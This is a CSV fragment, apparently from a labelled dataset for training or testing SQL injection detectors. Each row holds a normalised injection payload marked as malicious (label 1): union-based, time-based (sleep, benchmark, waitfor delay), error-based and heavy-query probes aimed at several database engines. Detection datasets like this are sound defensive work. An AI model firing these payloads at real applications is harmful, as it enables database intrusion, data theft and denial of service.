row_index,payload_norm,label,sqli_type_hint
9360,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
9361,"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
9362,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",1,
9363,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'dtym' = 'dtym",1,
9364,"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
9365,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",1,
9366,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih",1,
9367,-4325 order by 1--,1,
9368,"-2321%"" ) or 2271 = 7683--",1,
9369,"1"" ) as ranl where 5553 = 5553",1,
9370,"1' ) where 8628 = 8628 union all select null,null,null--",1,
9371,"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1,
9372,1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--,1,
9373,"-6186' in boolean mode ) union all select 2990,2990,2990#",1,
9374,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1,
9375,"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
9376,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce",1,
9377,"1 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9378,"1"" where 4073 = 4073 rlike ( select ( case when ( 8716 = 4281 ) then 1 else 0x28 end ) ) --",1,
9379,"1"" ) ) ) union all select null,null,null,null,null,null,null--",1,
9380,"waitfor delay '0:0:5' and ( ( ""%"" = """,1,
9381,"1"" ) where 2312 = 2312 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
9382,"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",1,
9383,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,
9384,"1"" ) ) and sleep ( 5 ) #",1,
9385,"-5925 ) where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,
9386,"1"" ) where 2873 = 2873 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9387,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) # usus",1,
9388,"1"" where 6004 = 6004",1,
9389,"1"" ) ) as svim where 4924 = 4924 and 7932 = 5870",1,
